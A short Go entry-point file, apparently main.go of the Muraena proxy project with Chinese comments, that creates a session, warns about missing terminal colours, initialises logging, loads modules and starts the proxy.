// 项目名称为 github.com/muraenateam/muraena
package main

import (
	"fmt"
	"os"

	// 就是项目本地路径
	"github.com/muraenateam/muraena/core/proxy"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module"
	"github.com/muraenateam/muraena/session"

	"github.com/evilsocket/islazy/tui"
)

func main() {

	sess, err := session.New()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	if !tui.Effects() {
		if *sess.Options.NoColors {
			fmt.Printf("\n\nWARNING: 终端颜色已被禁用，视图将非常有限。\n\n")
		} else {
			fmt.Printf("\n\nWARNING: 该终端不支持颜色，视图会非常有限。\n\n")
		}
	}

	// 初始化 Log
	log.Init(sess.Options, sess.Config.Log.Enabled, sess.Config.Log.FilePath)

	// 加载所有 modules
	module.LoadModules(sess)

	// Run Muraena
	proxy.Run(sess)
}
